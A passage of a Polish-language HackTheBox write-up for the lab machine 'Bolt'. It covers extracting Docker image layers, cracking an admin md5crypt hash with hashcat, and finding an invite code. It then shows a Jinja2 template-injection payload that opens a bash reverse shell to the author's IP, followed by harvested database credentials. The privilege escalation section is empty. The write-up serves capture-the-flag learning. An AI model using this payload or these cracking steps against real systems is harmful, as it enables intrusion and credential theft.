drwxr-xr-x <span style="color:#ae81ff">1</span> parrot parrot   <span style="color:#ae81ff">40</span> mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2021</span> 3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab
drwxr-xr-x <span style="color:#ae81ff">1</span> parrot parrot   <span style="color:#ae81ff">40</span> mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2021</span> 3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162
drwxr-xr-x <span style="color:#ae81ff">1</span> parrot parrot   <span style="color:#ae81ff">40</span> mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2021</span> 3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b
drwxr-xr-x <span style="color:#ae81ff">1</span> parrot parrot   <span style="color:#ae81ff">40</span> mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2021</span> 41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad
drwxr-xr-x <span style="color:#ae81ff">1</span> parrot parrot   <span style="color:#ae81ff">40</span> mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2021</span> 745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf
-rw-r--r-- <span style="color:#ae81ff">1</span> parrot parrot <span style="color:#ae81ff">3797</span> mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2021</span> 859e74798e6c82d5191cd0deaae8c124504052faa654d6691c21577a8fa50811.json
drwxr-xr-x <span style="color:#ae81ff">1</span> parrot parrot   <span style="color:#ae81ff">40</span> mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2021</span> 9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77
drwxr-xr-x <span style="color:#ae81ff">1</span> parrot parrot   <span style="color:#ae81ff">40</span> mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2021</span> a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2
drwxr-xr-x <span style="color:#ae81ff">1</span> parrot parrot   <span style="color:#ae81ff">40</span> mar  <span style="color:#ae81ff">5</span>  <span style="color:#ae81ff">2021</span> d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26
-rw-r--r-- <span style="color:#ae81ff">1</span> parrot parrot <span style="color:#ae81ff">1002</span> sty  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">1970</span> manifest.json
-rw-r--r-- <span style="color:#ae81ff">1</span> parrot parrot  <span style="color:#ae81ff">119</span> sty  <span style="color:#ae81ff">1</span>  <span style="color:#ae81ff">1970</span> repositories
drwxr-xr-x <span style="color:#ae81ff">1</span> root   root     <span style="color:#ae81ff">10</span> lut <span style="color:#ae81ff">18</span> 12:41 results
</code></pre></div><p>Przejrzałem kilka tych folderów, każdy zawiera kolejny plik <code>layer.tar</code>. Zatem postanowiłem rozpakować też te wszystkie archiwa. Wykorzystałem polecenie</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">find . -type f -iname <span style="color:#e6db74">&#34;*.tar&#34;</span> -print0 -execdir tar xf <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span> -delete
</code></pre></div><p>Teraz pierwszy folder wygląda tak</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220219192518.png" alt=""  />
</p>
<p>Ponieważ jest tego sporo, postanowiłem spróbować poszukać czegoś <code>grepem</code>.</p>
<p>No tylko tutaj <code>grep</code> niestety nie daje rady, za dużo jest tych podfolderów i za długo to trwa. Postanowiłem ograniczyć szukanie do 2 podfolderów i szukać jakichś maili, ponieważ mamy kilka formularzów do logowania z mailem.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌─<span style="color:#f92672">[</span>eu-free-3<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>10.10.15.13<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/htb/bolt/image<span style="color:#f92672">]</span>
└──╼ <span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$ find . -maxdepth <span style="color:#ae81ff">2</span> -exec grep -as <span style="color:#e6db74">&#39;@bolt.htb&#39;</span> <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span>
    DEFAULT_MAIL_SENDER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;support@bolt.htb&#39;</span>
&lt;<span style="color:#f92672">)</span>Padminadmin@bolt.htb$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.ex_User_1User
<span style="color:#f92672">)</span> admin@bolt.htb
</code></pre></div><p>Dodałem opcje <code>-H</code> do <code>grep</code>, dzięki czemu widzę dokładnie, w którym pliku znalezioną daną frazę</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">┌─<span style="color:#f92672">[</span>eu-free-3<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>10.10.15.13<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>parrot@parrot<span style="color:#f92672">]</span>─<span style="color:#f92672">[</span>~/htb/bolt/image<span style="color:#f92672">]</span>
└──╼ <span style="color:#f92672">[</span>★ <span style="color:#f92672">]</span>$ find . -maxdepth <span style="color:#ae81ff">2</span> -exec grep -Has <span style="color:#e6db74">&#39;@bolt.htb&#39;</span> <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\;</span>
./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/config.py:    DEFAULT_MAIL_SENDER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;support@bolt.htb&#39;</span>
&lt;<span style="color:#f92672">)</span>Padminadmin@bolt.htb$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.27af2976f2/db.sqlite3:<span style="color:#f92672">)</span><span style="color:#e6db74">&#39;;indexsqlite_autoindex_User_2User&#39;</span>;indexsqlite_autoindex_User_1User
./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3:<span style="color:#f92672">)</span> admin@bolt.htb
</code></pre></div><hr>
<h3 id="potencjalnie-ciekawe-dane">Potencjalnie ciekawe dane<a hidden class="anchor" aria-hidden="true" href="#potencjalnie-ciekawe-dane">#</a></h3>
<p>./745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/config.py</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Set up the App SECRET_KEY                                                                                                                               </span>
    SECRET_KEY <span style="color:#f92672">=</span> config<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;SECRET_KEY&#39;</span>, default<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;S#perS3crEt_007&#39;</span><span style="color:#f92672">)</span>                                                                                              
                                                                                                                                                              
    <span style="color:#75715e"># This will create a file in &lt;app&gt; FOLDER                                                                                                                 </span>
    SQLALCHEMY_DATABASE_URI <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;sqlite:///&#39;</span> + os.path.join<span style="color:#f92672">(</span>basedir, <span style="color:#e6db74">&#39;db.sqlite3&#39;</span><span style="color:#f92672">)</span>                                                                              
    SQLALCHEMY_TRACK_MODIFICATIONS <span style="color:#f92672">=</span> False                                                                                                                    
    MAIL_SERVER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;localhost&#39;</span>                                                                                                                                 
    MAIL_PORT <span style="color:#f92672">=</span> <span style="color:#ae81ff">25</span>                                                                                                                                            
    MAIL_USE_TLS <span style="color:#f92672">=</span> False                                                                                                                                      
    MAIL_USE_SSL <span style="color:#f92672">=</span> False                                                                                                                                      
    MAIL_USERNAME <span style="color:#f92672">=</span> None                                                                                                                                      
    MAIL_PASSWORD <span style="color:#f92672">=</span> None
    DEFAULT_MAIL_SENDER <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;support@bolt.htb&#39;</span>


	
<span style="color:#75715e"># PostgreSQL database</span>
    SQLALCHEMY_DATABASE_URI <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;{}://{}:{}@{}:{}/{}&#39;</span>.format<span style="color:#f92672">(</span>
        config<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_ENGINE&#39;</span>   , default<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;postgresql&#39;</span>    <span style="color:#f92672">)</span>,
        config<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_USERNAME&#39;</span> , default<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;appseed&#39;</span>       <span style="color:#f92672">)</span>,
        config<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PASS&#39;</span>     , default<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;pass&#39;</span>          <span style="color:#f92672">)</span>,
        config<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_HOST&#39;</span>     , default<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;localhost&#39;</span>     <span style="color:#f92672">)</span>,
        config<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_PORT&#39;</span>     , default<span style="color:#f92672">=</span><span style="color:#ae81ff">5432</span>            <span style="color:#f92672">)</span>,
        config<span style="color:#f92672">(</span> <span style="color:#e6db74">&#39;DB_NAME&#39;</span>     , default<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;appseed-flask&#39;</span> <span style="color:#f92672">)</span>
    <span style="color:#f92672">)</span>
</code></pre></div><p>./a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/db.sqlite3</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">k9tableUserUserCREATE TABLE <span style="color:#e6db74">&#34;User&#34;</span> <span style="color:#f92672">(</span>
        id INTEGER NOT NULL, 
        username VARCHAR, 
        email VARCHAR, 
        password BLOB, 
        email_confirmed BOOLEAN, 
        profile_update VARCHAR<span style="color:#f92672">(</span>80<span style="color:#f92672">)</span>, 
        PRIMARY KEY <span style="color:#f92672">(</span>id<span style="color:#f92672">)</span>, 
        UNIQUE <span style="color:#f92672">(</span>username<span style="color:#f92672">)</span>, 
        UNIQUE <span style="color:#f92672">(</span>email<span style="color:#f92672">)</span>
&lt;<span style="color:#f92672">)</span>Padminadmin@bolt.htb$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.ex_User_1User
        admin
<span style="color:#f92672">)</span>       admin@bolt.htb
</code></pre></div><p>Mamy hash <code>$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.</code>, sprawdziłem i jest to md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5).</p>
<p>Odpaliłem <code>hashcata</code> i po chwili otrzymałem złamane hasło</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">hashcat -a <span style="color:#ae81ff">0</span> -m <span style="color:#ae81ff">500</span> admin.hash /usr/share/wordlists/rockyou.txt

$1$sm1RceCh$rSd3PygnS/6jlFDfF2J5q.:deadbolt

</code></pre></div><p><code>admin:deadbolt</code></p>
<p>Hasło zadziałało na subdomene <code>bolt.htb</code>.</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223133615.png" alt=""  />
</p>
<p>Natomiast nic ciekawego tutaj nie znalazłem. Postanowiłem poszukać jeszcze na pozostałych subdomenach. Na <code>mail.bolt.htb</code> na te dane logowania, odpowiedź jest nieco inna niż przy niepoprawnych danych.</p>
<p>Otrzymujemy taką odpowiedź</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223135823.png" alt=""  />
</p>
<p>Normalnie, przy losowych danych komunikat to po prostu <code>Login failed.</code></p>
<p>Spróbowałem czegoś z <code>BurpSuite</code>, ale okazało się to błędnym tropem</p>
<hr>
<h3 id="ponowne-wypakowanie">Ponowne wypakowanie<a hidden class="anchor" aria-hidden="true" href="#ponowne-wypakowanie">#</a></h3>
<p>Absolutnie utkwiłem w tym miejscu. Sprawdziłem metodologie IppSeca. Okazało się, rozwiązania trzeba szukać w rejestracji użytkowników i polu <code>Invite code</code> . Tylko że po części błędnie wypakowałem pliki <code>layer.tar</code> i należy to poprawić.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cat manifest.json | jq .<span style="color:#f92672">[]</span>.Layers &gt; ../layers


<span style="color:#f92672">[</span>
  <span style="color:#e6db74">&#34;187e74706bdc9cb3f44dca230ac7c9962288a5b8bd579c47a36abf64f35c2950/layer.tar&#34;</span>,
  <span style="color:#e6db74">&#34;745959c3a65c3899f9e1a5319ee5500f199e0cadf8d487b92e2f297441f8c5cf/layer.tar&#34;</span>,
  <span style="color:#e6db74">&#34;41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/layer.tar&#34;</span>,
  <span style="color:#e6db74">&#34;d693a85325229cdf0fecd248731c346edbc4e02b0c6321e256ffc588a3e6cb26/layer.tar&#34;</span>,
  <span style="color:#e6db74">&#34;3d7e9c6869c056cdffaace812b4ec198267e26e03e9be25ed81fe92ad6130c6b/layer.tar&#34;</span>,
  <span style="color:#e6db74">&#34;9a3bb655a4d35896e951f1528578693762650f76d7fb3aa791ac8eec9f14bc77/layer.tar&#34;</span>,
  <span style="color:#e6db74">&#34;1be1cefeda09a601dd9baa310a3704d6309dc28f6d213867911cd2257b95677c/layer.tar&#34;</span>,
  <span style="color:#e6db74">&#34;a4ea7da8de7bfbf327b56b0cb794aed9a8487d31e588b75029f6b527af2976f2/layer.tar&#34;</span>,
  <span style="color:#e6db74">&#34;3049862d975f250783ddb4ea0e9cb359578da4a06bf84f05a7ea69ad8d508dab/layer.tar&#34;</span>,
  <span style="color:#e6db74">&#34;2265c5097f0b290a53b7556fd5d721ffad8a4921bfc2a6e378c04859185d27fa/layer.tar&#34;</span>,
  <span style="color:#e6db74">&#34;3350815d3bdf21771408f91da4551ca6f4e82edce74e9352ed75c2e8a5e68162/layer.tar&#34;</span>
<span style="color:#f92672">]</span>
</code></pre></div><p>Należy teraz to oczyścić. I zrobię to tak jak IppSec, po kolei rozpakuje kolejne tary do output.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">mkdir output
cd output
<span style="color:#66d9ef">for</span> i in <span style="color:#66d9ef">$(</span>cat layers<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> tar -C output -xvf $i; <span style="color:#66d9ef">done</span>
</code></pre></div><p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223153016.png" alt=""  />
</p>
<p>W ten sposób otrzymujemy składny system plików. Warto spojrzeć na nietypowy folder <code>app</code>.</p>
<p>W folderze <code>app</code> mamy rozgałęzienie na <code>home</code> oraz <code>base</code>. Foldery różnią się od siebie. Mianowicie w podfolderze <code>base</code> znajdziemy informacje o rejestracji użytkowników.</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223154020.png" alt=""  />
</p>
<p>Wykorzystując mój stary skrypt z wypakowaniem każdego <code>layer.tar</code> w danym folderze możemy znaleźć dodatkowy plik</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223155449.png" alt=""  />
</p>
<p>No i w pliku <code>./41093412e0da959c80875bb0db640c1302d5bcdffec759a3a5670950272789ad/app/base/routes.py</code> mamy dodatkową treść, której wcześniej nie widzieliśmy.</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223155539.png" alt=""  />
</p>
<p>code = XNSS-HSJW-3NGU-8XTJ</p>
<hr>
<h3 id="nowy-użytkownik">Nowy użytkownik<a hidden class="anchor" aria-hidden="true" href="#nowy-użytkownik">#</a></h3>
<p>Stworzyłem nowego użytkownika. Udało mi się zalogować tymi danymi logowania nie tylko na <code>demo.bolt.htb</code>, ale również na <code>mail.bolt.htb</code>. Podatny okazuje sie ten formularz</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223161244.png" alt=""  />
</p>
<p>Gdy wpisałem losowe rzeczy, na subdomene z mailem przyszła wiadomość</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223161315.png" alt=""  />
</p>
<p>Jak się okazuje, jest to podatność <code>SSTI</code>, ktorą można wykorzystać.</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223162215.png" alt=""  />
</p>
<p>To jest akurat ciekawe, ponieważ całkowicie pominąłem nazwę <code>Jinja</code> w tytule stron</p>
<p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223162404.png" alt=""  />
</p>
<p>A to potencjalnie też ważna informacja.</p>
<p>Na <code>PayloadAllTheThings</code> można znaleźć najważniejsze informacje jak wykorzystać tą podatność.</p>
<p><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">{{</span> self._TemplateReference__context.cycler.__init__.__globals__.os.popen<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/bin/bash -c &#34;/bin/bash -i &gt;&amp; /dev/tcp/10.10.15.13/8000 0&gt;&amp;1&#39;</span><span style="color:#f92672">)</span>.read<span style="color:#f92672">()</span> <span style="color:#f92672">}}</span>
</code></pre></div><p><img loading="lazy" src="../../../static/screenshots/Pasted%20image%2020220223163127.png" alt=""  />
</p>
<hr>
<h3 id="www-data">www-data<a hidden class="anchor" aria-hidden="true" href="#www-data">#</a></h3>
<p>Mamy na boxie dwóch użytkowników <code>clark</code> oraz <code>eddie</code>.</p>
<p>LinPeas</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">╔══════════╣ Analyzing Passbolt Files <span style="color:#f92672">(</span>limit 70<span style="color:#f92672">)</span>                                                                                                              
-rw-r----- <span style="color:#ae81ff">1</span> root www-data <span style="color:#ae81ff">3128</span> Feb <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2021</span> /etc/passbolt/passbolt.php                                                                                       
 * Passbolt ~ Open source password manager <span style="color:#66d9ef">for</span> teams                                                                                                          
            <span style="color:#e6db74">&#39;host&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;localhost&#39;</span>,                                                                                                                            
            <span style="color:#e6db74">&#39;port&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;3306&#39;</span>,                                                                                                                                 
            <span style="color:#e6db74">&#39;username&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;passbolt&#39;</span>,                                                                                                                         
            <span style="color:#e6db74">&#39;password&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;rT2;jW7&lt;eY8!dX8}pQ8%&#39;</span>,                                                                                                             
            <span style="color:#e6db74">&#39;database&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;passboltdb&#39;</span>,                                                                                                                       
    <span style="color:#e6db74">&#39;EmailTransport&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">[</span>                                                                                                                                     
            <span style="color:#e6db74">&#39;host&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;localhost&#39;</span>,                                                                                                                            
            <span style="color:#e6db74">&#39;port&#39;</span> <span style="color:#f92672">=</span>&gt; 587,                                                                                                                                    
            <span style="color:#e6db74">&#39;username&#39;</span> <span style="color:#f92672">=</span>&gt; null,                                                                                                                               
            <span style="color:#e6db74">&#39;password&#39;</span> <span style="color:#f92672">=</span>&gt; null,                                                                                                                               
            <span style="color:#e6db74">&#39;from&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#f92672">[</span><span style="color:#e6db74">&#39;localhost@bolt.htb&#39;</span> <span style="color:#f92672">=</span>&gt; <span style="color:#e6db74">&#39;localhost&#39;</span><span style="color:#f92672">]</span>,
</code></pre></div><p><code>passbolt:rT2;jW7&lt;eY8!dX8}pQ8%</code></p>
<p>mysql -u passbolt -p passboltdb</p>
<hr>
<h1 id="privilege-escalation">Privilege Escalation<a hidden class="anchor" aria-hidden="true" href="#privilege-escalation">#</a></h1>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">
</code></pre></div>

  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://lavatann.github.io/tags/linux/">Linux</a></li>
      <li><a href="https://lavatann.github.io/tags/medium/">Medium</a></li>
      <li><a href="https://lavatann.github.io/tags/retired/">Retired</a></li>
    </ul>
<nav class="paginav">
  <a class="prev" href="https://lavatann.github.io/posts/hackthebox/academy/">
    <span class="title">« Prev Page</span>
    <br>
    <span>Academy - HackTheBox</span>
  </a>
  <a class="next" href="https://lavatann.github.io/posts/hackthebox/archetype/">
    <span class="title">Next Page »</span>
    <br>
    <span>Archetype - HackTheBox</span>
  </a>
</nav>


<div class="share-buttons">
    <a target="_blank" rel="noopener noreferrer" aria-label="share Bolt - HackTheBox on twitter"
        href="https://twitter.com/intent/tweet/?text=Bolt%20-%20HackTheBox&amp;url=https%3a%2f%2flavatann.github.io%2fposts%2fhackthebox%2fbolt%2f&amp;hashtags=Linux%2cMedium%2cRetired">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-253.927,424.544c135.939,0 210.268,-112.643 210.268,-210.268c0,-3.218 0,-6.437 -0.153,-9.502c14.406,-10.421 26.973,-23.448 36.935,-38.314c-13.18,5.824 -27.433,9.809 -42.452,11.648c15.326,-9.196 26.973,-23.602 32.49,-40.92c-14.252,8.429 -30.038,14.56 -46.896,17.931c-13.487,-14.406 -32.644,-23.295 -53.946,-23.295c-40.767,0 -73.87,33.104 -73.87,73.87c0,5.824 0.613,11.494 1.992,16.858c-61.456,-3.065 -115.862,-32.49 -152.337,-77.241c-6.284,10.881 -9.962,23.601 -9.962,37.088c0,25.594 13.027,48.276 32.95,61.456c-12.107,-0.307 -23.448,-3.678 -33.41,-9.196l0,0.92c0,35.862 25.441,65.594 59.311,72.49c-6.13,1.686 -12.72,2.606 -19.464,2.606c-4.751,0 -9.348,-0.46 -13.946,-1.38c9.349,29.426 36.628,50.728 68.965,51.341c-25.287,19.771 -57.164,31.571 -91.8,31.571c-5.977,0 -11.801,-0.306 -17.625,-1.073c32.337,21.15 71.264,33.41 112.95,33.41Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Bolt - HackTheBox on linkedin"
        href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2flavatann.github.io%2fposts%2fhackthebox%2fbolt%2f&amp;title=Bolt%20-%20HackTheBox&amp;summary=Bolt%20-%20HackTheBox&amp;source=https%3a%2f%2flavatann.github.io%2fposts%2fhackthebox%2fbolt%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Bolt - HackTheBox on reddit"
        href="https://reddit.com/submit?url=https%3a%2f%2flavatann.github.io%2fposts%2fhackthebox%2fbolt%2f&title=Bolt%20-%20HackTheBox">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Bolt - HackTheBox on facebook"
        href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2flavatann.github.io%2fposts%2fhackthebox%2fbolt%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
                d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
        </svg>
    </a>
    <a target="_blank" rel="noopener noreferrer" aria-label="share Bolt - HackTheBox on whatsapp"
        href="https://api.whatsapp.com/send?text=Bolt%20-%20HackTheBox%20-%20https%3a%2f%2flavatann.github.io%2fposts%2fhackthebox%2fbolt%2f">
        <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve">
            <path
